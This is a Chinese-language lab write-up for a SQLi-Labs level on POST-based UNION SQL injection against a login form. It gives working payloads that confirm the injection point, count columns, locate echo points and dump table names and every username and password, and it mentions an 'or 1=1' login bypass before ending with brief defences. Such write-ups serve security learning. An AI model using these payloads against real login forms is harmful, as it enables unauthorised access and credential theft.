## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：简单
- 通关标识：在登录框（POST 请求）中利用联合查询（UNION）绕过验证并爆出所有账号密码。

## 二、大白话原理讲解
前 10 关，我们都是在 URL 地址栏里直接跟柜员（数据库）对话。这一关，柜台前多了一个“登录机”，你必须填好用户名和密码，由登录机转交给后台。

既然不能直接在地址栏喊话，我们就得把“魔法咒语”写在**用户名**的框里递进去。
后台的检查逻辑大概是：“如果用户名和密码都对，就让你进去。”
我们输入 `-1' union select 1, database() --+`，直接把它的检查逻辑给撕裂，强行让它把数据库的名字打印在“你的密码”那一栏里。这就叫**POST 联合查询注入**。

## 三、解题步骤

**1. 抓包与测注入点**
由于是 POST 请求，无法直接在浏览器地址栏构造，需要使用 **Burp Suite** 或浏览器插件 **HackBar**。
在登录框随意输入 `admin` / `123`，抓取请求包，发现参数为 `uname=admin&passwd=123&submit=Submit`。
在 `uname` 中输入 `admin'`，页面报错，确认单引号闭合。

**2. 确认列数（ORDER BY）**
在 `uname` 参数中测试：
```text
uname=-1' order by 2 --+&passwd=123&submit=Submit
```
（如果 2 正常，3 报错，说明查询结果有 2 列）

**3. 寻找回显点（UNION SELECT）**
```text
uname=-1' union select 1,2 --+&passwd=123&submit=Submit
```
**结论**：页面回显了 `1` 和 `2`，说明这两个位置可以控制。

**4. 爆库、爆表、爆数据**
直接把查询内容替换到 `uname` 参数中：

*   **查库名**：
```text
uname=-1' union select 1,database() --+&passwd=123&submit=Submit
```
（回显库名：`security`）

*   **查表名**：
```text
uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+&passwd=123&submit=Submit
```

*   **查字段名**：
```text
uname=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=123&submit=Submit
```

*   **终极拖库**：
```text
uname=-1' union select 1,group_concat(username,0x3a,password) from users --+&passwd=123&submit=Submit
```
*(注：`0x3a` 是冒号的十六进制)*

**5. 验证结果**
页面下方回显了 `Your Password:Dumb:Dumb,Angelina:I-kill-you...` 等所有账号密码，成功通关。

## 四、知识点解析
1. **POST 注入**：注入点不在 URL 里，而在请求体（Body）的数据表单中，无法通过地址栏直接注入，必须借助工具修改数据包。
2. **万能密码（OR 注入）**：如 `admin' or 1=1 --+`，利用逻辑或让查询永远为真，从而绕过登录校验。在本关中同样适用。
3. **UNION 联合查询的通用性**：不管参数是在 URL 里还是 POST 体里，`ORDER BY`、`UNION SELECT`、`GROUP_CONCAT` 的打法逻辑完全通用。

## 五、总结与防御
**本题总结**：
POST 注入只是数据提交位置变了，注入的原理和 Payload 构造与 GET 注入毫无二致。关键在于熟练掌握抓包工具。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：最根本的防御。
- **密码哈希比对**：后端应该用哈希（如 bcrypt）比对密码，而不是直接拼接 SQL 语句查询。
